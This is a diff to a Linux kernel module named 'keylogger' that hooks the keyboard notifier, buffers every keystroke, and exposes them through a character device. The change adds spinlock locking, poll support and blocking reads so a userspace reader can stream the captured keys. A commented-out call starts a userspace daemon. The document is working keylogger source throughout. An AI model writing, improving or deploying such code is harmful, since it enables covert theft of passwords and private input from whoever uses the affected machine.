@@ -6,7 +6,10 @@
 #include <linux/keyboard.h>
 #include <linux/fs.h>
 #include <linux/kmod.h>
-#include <linux/mutex.h>
+//#include <linux/mutex.h>
+#include <linux/sched.h>
+#include <linux/poll.h>
+#include <linux/spinlock.h>
 #include <asm/uaccess.h>
 
 #define DEVICE_NAME "keylogger"     /* dev name as it appears in /proc/devices and /dev/ */
@@ -35,23 +38,36 @@ static unsigned short begin = 0;
 static unsigned short end = 0;
 static unsigned char omittedKeys = 0;
 
+// blocking read
+static spinlock_t lock;
+static wait_queue_head_t waitq;
+
 /* The prototype functions for the character driver */
 static int     device_open(struct inode *, struct file *);
 static int     device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char *, size_t, loff_t *);
 static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
+static unsigned int device_poll(struct file *, struct poll_table_struct *);
 
 static struct file_operations fops =
 {
     .read = device_read,
     .write = device_write,
     .open = device_open,
-    .release = device_release
+    .release = device_release,
+	.poll = device_poll
 };
 
 static int is_device_full(void)
 {
     return (end + 1) % BUFFER_LEN == begin;
+}
+
+static unsigned int device_poll(struct file *filp, struct poll_table_struct *pt)
+{
+	unsigned int ret = 0;
+	if (begin != end) ret = (POLLIN | POLLRDNORM);
+	return ret;
 }
 
 static int start_deamon(void)
@@ -62,7 +78,7 @@ static int start_deamon(void)
     static char *envp[] = {
             "HOME=/",
             "TERM=linux",
-            "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+ 	        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
 
     sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL);
     if (sub_info == NULL)
@@ -83,7 +99,7 @@ static int log_key(struct notifier_block *nblock, unsigned long code, void *_par
         return NOTIFY_OK;
     }
 
-    mutex_lock(&keyloggerDevice->mutex);
+    spin_lock(&lock);
 
     if (!is_device_full())
     {
@@ -108,7 +124,11 @@ static int log_key(struct notifier_block *nblock, unsigned long code, void *_par
         omittedKeys++;
     }
 
-    mutex_unlock(&keyloggerDevice->mutex);
+    spin_unlock(&lock);
+    wake_up(&waitq);
+
+    
+	printk(KERN_ALERT "log_key %d %d \n", begin, end);
 
     return NOTIFY_OK;
 }
@@ -145,7 +165,11 @@ static int __init keylogger_init(void)
     }
 
     register_keyboard_notifier(&nb);
+    spin_lock_init(&lock);
     mutex_init(&keyloggerDevice->mutex);
+
+	init_waitqueue_head(&waitq);
+
 
     //start_deamon()
     return 0;
@@ -167,7 +191,15 @@ static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_
 {
     unsigned short bytes_read;
     printk(KERN_ALERT "read \n");
-    mutex_lock(&keyloggerDevice->mutex);
+    spin_lock(&lock);
+
+    while (begin == end) { /* nothing to read */
+//        spin_unlock(&lock); /* release the lock */
+//        if (filp->f_flags & O_NONBLOCK)
+//            return -EAGAIN;
+//        PDEBUG("\"%s\" reading: going to sleep\n", current->comm);
+        wait_event_lock_irq(waitq, (begin != end), lock);
+    }
 
     /* copy data from the kernel data segment to the user data segment */
     for (bytes_read = 0; begin != end && bytes_read <= length; begin = (begin + 1) % BUFFER_LEN, ++bytes_read)
@@ -175,7 +207,8 @@ static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_
         put_user(dev_buffer[begin], buffer + bytes_read);
     }
 
-    mutex_unlock(&keyloggerDevice->mutex);
+    spin_unlock(&lock);
+    wake_up(&waitq);
 
     return bytes_read;
 }
